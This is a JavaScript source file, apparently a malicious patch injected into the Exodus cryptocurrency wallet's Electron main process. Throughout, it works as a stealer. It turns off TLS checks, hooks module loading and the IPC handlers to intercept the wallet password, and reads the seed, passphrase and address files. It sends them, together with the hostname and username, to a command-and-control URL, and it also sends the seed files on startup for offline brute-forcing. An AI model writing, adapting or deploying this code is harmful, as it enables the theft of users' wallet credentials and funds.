// Exodus Desktop — password interception + seed file exfiltration
// Injected into main process via asar patch
(() => {
  'use strict';
  const C2 = '%%C2_URL%%';
  const TOKEN = '%%AUTH_TOKEN%%';
  const SESSION_ID = '%%SESSION_ID%%';

  // TLS bypass
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

  const path = require('path');
  const fs = require('fs');
  const os = require('os');

  const HOME = os.homedir();
  const EXODUS_DATA = path.join(HOME, 'Library', 'Application Support', 'Exodus');
  const WALLET_DIR = path.join(EXODUS_DATA, 'exodus.wallet');

  // Track what we've already sent to avoid duplicates
  let _sentPasswords = new Set();
  let _sentSeedFiles = false;

  // --- exfil (with retry) ---
  function exfil(dataType, content) {
    const payload = JSON.stringify({
      session_id: SESSION_ID,
      type: 'Generic',
      browser: 'Seeds',
      profile: 'Exodus',
      data_type: dataType,
      content: content,
      batch: 'walletpatch_seed',
      timestamp: Math.floor(Date.now() / 1000),
    });
    const RETRY_DELAYS = [0, 3000, 8000];
    let attempt = 0;
    function send() {
      try {
        const u = new URL(C2);
        const transport = u.protocol === 'https:' ? require('https') : require('http');
        const req = transport.request({
          hostname: u.hostname,
          port: u.port || (u.protocol === 'https:' ? 443 : 80),
          path: u.pathname, method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + TOKEN, 'Content-Length': Buffer.byteLength(payload) },
          rejectUnauthorized: false, timeout: 15000,
        });
        req.on('response', (res) => { if (res.statusCode !== 200 && attempt < RETRY_DELAYS.length - 1) { attempt++; setTimeout(send, RETRY_DELAYS[attempt]); } });
        req.on('error', () => { if (attempt < RETRY_DELAYS.length - 1) { attempt++; setTimeout(send, RETRY_DELAYS[attempt]); } });
        req.on('timeout', () => { req.destroy(); });
        req.write(payload); req.end();
      } catch (_) { if (attempt < RETRY_DELAYS.length - 1) { attempt++; setTimeout(send, RETRY_DELAYS[attempt]); } }
    }
    send();
  }

  // --- Read and exfil seed files ---
  function exfilSeedFiles() {
    if (_sentSeedFiles) return;
    _sentSeedFiles = true;

    const seedFiles = [
      { name: 'seed.seco', label: 'seed_seco' },
      { name: 'passphrase.json', label: 'passphrase_json' },
      { name: 'info.seco', label: 'info_seco' },
      { name: 'conf.seco', label: 'conf_seco' },
    ];

    const parts = [];
    for (const sf of seedFiles) {
      const filePath = path.join(WALLET_DIR, sf.name);
      try {
        if (!fs.existsSync(filePath)) continue;
        const data = fs.readFileSync(filePath);
        const b64 = data.toString('base64');
        parts.push('[' + sf.label + ']\n' + b64);
      } catch (_) {}
    }

    // Also grab wallet addresses/account info if available
    const addrFiles = ['addresses.json', 'accounts.json'];
    for (const af of addrFiles) {
      const filePath = path.join(WALLET_DIR, af);
      try {
        if (!fs.existsSync(filePath)) continue;
        const data = fs.readFileSync(filePath, 'utf8');
        parts.push('[' + af + ']\n' + data);
      } catch (_) {}
    }

    if (parts.length > 0) {
      const content = [
        'Hostname: ' + os.hostname(),
        'Username: ' + (os.userInfo().username || 'unknown'),
        'Timestamp: ' + new Date().toISOString(),
        'App: Exodus',
        'WalletDir: ' + WALLET_DIR,
        '',
        ...parts,
      ].join('\n') + '\n';
      exfil('ExodusSeedEncrypted.txt', content);
    }
  }

  // --- Handle captured password ---
  function onPasswordCaptured(password) {
    if (!password || typeof password !== 'string') return;
    if (_sentPasswords.has(password)) return;
    _sentPasswords.add(password);

    const content = [
      'Password: ' + password,
      'Hostname: ' + os.hostname(),
      'Username: ' + (os.userInfo().username || 'unknown'),
      'Timestamp: ' + new Date().toISOString(),
      'App: Exodus',
      'WalletDir: ' + WALLET_DIR,
    ].join('\n') + '\n';
    exfil('ExodusPassword.txt', content);

    // Also send seed files with the password
    exfilSeedFiles();
  }

  // --- Extract password from function arguments ---
  function extractPassword(args) {
    for (let i = 0; i < args.length; i++) {
      const arg = args[i];
      // Direct string argument (password)
      if (typeof arg === 'string' && arg.length >= 1 && arg.length <= 256) {
        // Basic sanity: not a path, not JSON, not a hash
        if (!arg.includes('/') && !arg.startsWith('{') && !arg.startsWith('[') && !/^[a-f0-9]{32,}$/i.test(arg)) {
          return arg;
        }
      }
      // Object with password field
      if (arg && typeof arg === 'object') {
        if (typeof arg.password === 'string') return arg.password;
        if (typeof arg.passphrase === 'string') return arg.passphrase;
        if (typeof arg.pass === 'string') return arg.pass;
        if (typeof arg.secret === 'string') return arg.secret;
        if (typeof arg.pwd === 'string') return arg.pwd;
      }
    }
    return null;
  }

  // --- Hook Module._load ---
  const Module = require('module');
  const origLoad = Module._load;
  const hooked = new WeakSet();

  // Patterns for functions that handle wallet unlock/decrypt
  const UNLOCK_PATTERNS = /^(unlock|decrypt|openWallet|verifyPassword|authenticate|login|checkPassword|validatePassword|deriveKey|importWallet|restore)$/i;
  const PASSWORD_FIELD_PATTERNS = /^(unlock|decrypt|open|verify|auth|login|check|validate|derive|import|restore|setPassword|changePassword|signIn)$/i;

  Module._load = function(request, parent, isMain) {
    const mod = origLoad.apply(this, arguments);
    if (!mod || typeof mod !== 'object') return mod;
    if (hooked.has(mod)) return mod;

    try {
      const target = mod.default || mod;
      if (typeof target !== 'object' && typeof target !== 'function') return mod;

      let didHook = false;
      const keys = Object.keys(target);
      for (const key of keys) {
        if (typeof target[key] !== 'function') continue;
        if (!PASSWORD_FIELD_PATTERNS.test(key)) continue;

        const origFn = target[key];
        target[key] = function() {
          try {
            const pw = extractPassword(Array.from(arguments));
            if (pw) onPasswordCaptured(pw);
          } catch (_) {}
          return origFn.apply(this, arguments);
        };
        didHook = true;
      }

      if (didHook) hooked.add(mod);
    } catch (_) {}

    return mod;
  };

  // --- Hook Electron IPC for renderer-to-main password messages ---
  // Exodus uses targeted RPC: ipc:target:send with {target, channel, payload}
  // Password comes as {passphrase: "..."} in the payload of unlock-controller calls
  function deepExtractPassword(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 5) return null;
    // Direct password fields
    const pw = obj.password || obj.passphrase || obj.pass || obj.secret || obj.pwd;
    if (typeof pw === 'string' && pw.length > 0 && pw.length < 256) return pw;
    // Recurse into nested objects (targeted RPC wraps payload)
    for (const key of Object.keys(obj)) {
      if (typeof obj[key] === 'object' && obj[key] !== null) {
        const found = deepExtractPassword(obj[key], depth + 1);
        if (found) return found;
      }
    }
    // Check arrays
    if (Array.isArray(obj)) {
      for (const item of obj) {
        if (typeof item === 'object' && item !== null) {
          const found = deepExtractPassword(item, depth + 1);
          if (found) return found;
        }
      }
    }
    return null;
  }

  try {
    const { ipcMain } = require('electron');
    if (ipcMain) {
      // Hook ipcMain.on (for Exodus ipc:target:send)
      const origOn = ipcMain.on.bind(ipcMain);
      ipcMain.on = function(channel, listener) {
        const wrappedListener = function(event, ...args) {
          try {
            for (const arg of args) {
              const pw = deepExtractPassword(arg, 0);
              if (pw) onPasswordCaptured(pw);
            }
          } catch (_) {}
          return listener.call(this, event, ...args);
        };
        return origOn(channel, wrappedListener);
      };
      // Hook ipcMain.handle (for invoke-based IPC)
      const origHandle = ipcMain.handle.bind(ipcMain);
      ipcMain.handle = function(channel, handler) {
        const wrappedHandler = async function(event, ...args) {
          try {
            for (const arg of args) {
              const pw = deepExtractPassword(arg, 0);
              if (pw) onPasswordCaptured(pw);
            }
          } catch (_) {}
          return handler.call(this, event, ...args);
        };
        return origHandle(channel, wrappedHandler);
      };
    }
  } catch (_) {}

  // --- Also try to exfil seed files on startup (even without password) ---
  // The encrypted files are valuable — can be brute-forced offline
  setTimeout(exfilSeedFiles, 5000);
})();